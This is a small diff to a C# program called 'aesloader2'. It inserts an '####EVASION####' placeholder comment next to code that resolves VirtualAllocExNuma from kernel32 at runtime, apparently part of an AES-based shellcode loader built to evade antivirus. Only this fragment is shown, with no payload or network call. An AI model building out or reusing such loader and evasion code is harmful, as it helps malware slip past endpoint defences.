@@ -341,6 +341,9 @@ namespace aesloader2
         }
         public static void Main(string[] args)
         {
+
+            //####EVASION####
+            
             IntPtr pointer = Invoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
             DELEGATES.VirtualAllocExNuma VirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.VirtualAllocExNuma)) as DELEGATES.VirtualAllocExNuma;
 
